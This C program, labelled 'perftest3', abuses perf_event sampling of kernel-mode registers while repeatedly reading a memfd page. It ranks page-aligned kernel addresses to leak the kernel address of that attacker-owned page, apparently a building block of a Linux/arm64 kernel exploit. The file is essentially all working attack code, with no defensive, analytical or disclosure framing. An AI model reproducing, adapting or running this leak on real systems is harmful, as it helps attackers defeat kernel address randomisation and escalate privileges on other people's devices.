/* perftest3: deterministic-ish leak of OUR memfd page address: self-copy
 * (pread into an mmap of the same page) so only that one page is touched. */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <linux/perf_event.h>
#include <linux/memfd.h>

int main(void) {
  setvbuf(stdout, NULL, _IONBF, 0);
  int fd = syscall(__NR_memfd_create, "x", 0);
  if (fd < 0) { printf("memfd errno=%d\n", errno); return 1; }
  if (ftruncate(fd, 4096) < 0) { printf("ftruncate errno=%d\n", errno); return 1; }
  char *m = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (m == MAP_FAILED) { printf("mmap errno=%d\n", errno); return 1; }
  memset(m, 0x41, 4096);   /* fill + fault */

  struct perf_event_attr pe; memset(&pe, 0, sizeof pe);
  pe.type = PERF_TYPE_SOFTWARE; pe.size = sizeof pe;
  pe.config = PERF_COUNT_SW_CPU_CLOCK; pe.sample_period = 200;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1; pe.exclude_user = 1; pe.exclude_hv = 1; pe.exclude_idle = 1;
  int pfd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (pfd < 0) { printf("perf errno=%d\n", errno); return 1; }
  uint8_t *buf = mmap(NULL, 4096 * 33, PROT_READ | PROT_WRITE, MAP_SHARED, pfd, 0);
  if (buf == MAP_FAILED) { printf("perfmmap errno=%d\n", errno); return 1; }
  ioctl(pfd, PERF_EVENT_IOC_ENABLE, 0);
  for (long i = 0; i < 500000; i++) { pread(fd, m, 4096, 0); }
  ioctl(pfd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = (void *)buf;
  uint64_t head = hdr->data_head; __sync_synchronize();
  char *base = (char *)buf + 4096; size_t dsz = 4096 * 32; uint64_t pos = hdr->data_tail;
  static uint64_t cand[32768]; static int cnt[32768]; int nc = 0;
  long npg = 0;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev); p += 8;
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32; i++) {
          uint64_t v = regs[i];
          if (v >= 0xffffffc000000000ULL && v < 0xffffffff00000000ULL && (v & 0xfff) == 0) {
            npg++;
            int f = -1; for (int k = 0; k < nc; k++) if (cand[k] == v) { f = k; break; }
            if (f < 0 && nc < 32768) { cand[nc] = v; cnt[nc] = 1; nc++; } else if (f >= 0) cnt[f]++;
          }
        }
      }
    }
    pos += ev->size;
  }
  printf("page_aligned_regs=%ld distinct_page_candidates=%d\n", npg, nc);
  for (int r = 0; r < 10; r++) {
    int bi = -1;
    for (int k = 0; k < nc; k++) { if (cnt[k] < 0) continue; if (bi < 0 || cnt[k] > cnt[bi]) bi = k; }
    if (bi < 0) break;
    printf("  %016llx count=%d\n", (unsigned long long)cand[bi], cnt[bi]);
    cnt[bi] = -1;
  }
  return 0;
}
